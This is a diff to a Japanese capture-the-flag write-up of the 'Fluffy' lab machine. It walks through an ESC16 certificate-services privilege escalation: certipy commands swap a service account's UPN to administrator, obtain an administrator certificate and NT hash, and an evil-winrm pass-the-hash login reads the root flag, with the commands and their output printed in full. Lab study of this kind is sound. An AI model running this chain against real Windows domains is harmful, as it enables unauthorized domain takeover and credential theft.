@@ -427,9 +427,10 @@ Certificate Authorities
       ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
+この[リンク](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)どおりにesc16を悪用する  
 ここでpfxを使用できるのはEnrollに登録されている「cert publisher」なのでca_svcを使用してpfxを取得する必要がある  
 またupnの変更はwrite権限が必要であり、step3およびstep4でwinrm_svcの所属先であるserviceaccountsグループはca_svcユーザに対してgenericwrite権限を有していることを確認した  
-ということでwinrm_svcユーザ権限でca_svcのupnを変更する
+ということでwinrm_svcユーザ権限でca_svcのupnをadministratorに変更する
 ```sh
 └─$ certipy-ad account -user ca_svc -upn administrator -dc-ip 10.129.250.233 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 update
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -453,6 +454,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
     whenCreated                         : 2025-04-17T16:07:50+00:00
     whenChanged                         : 2025-10-27T21:01:15+00:00
 ```
+拡張機能無効によるobjectsidの未検証により、upnに登録されたadministratorのpfxを取得した
 ```sh
 └─$ certipy-ad req -ca fluffy-DC01-CA  -template User -target-ip 10.129.250.233 -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -468,6 +470,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'administrator.pfx'
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
+このままだと偽装したupnと正規のupnが衝突するため、ca_svcのupnを元の設定に戻す
 ```sh
 └─$ certipy-ad account -user ca_svc -upn ca_svc@fluffy.htb -dc-ip 10.129.250.233 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 update
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -476,6 +479,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
     userPrincipalName                   : ca_svc@fluffy.htb
 [*] Successfully updated 'ca_svc'
 ```
+administratorのpfxを使用して、tgtとntハッシュを取得！
 ```sh
 └─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.250.233 -domain fluffy.htb
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -489,4 +493,19 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+```
+winrmでログイン成功  
+ルートフラグゲット
+```sh
+└─$ evil-winrm -i 10.129.232.88 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
+586d1211080c00e537771e7d76842b5c
 ```
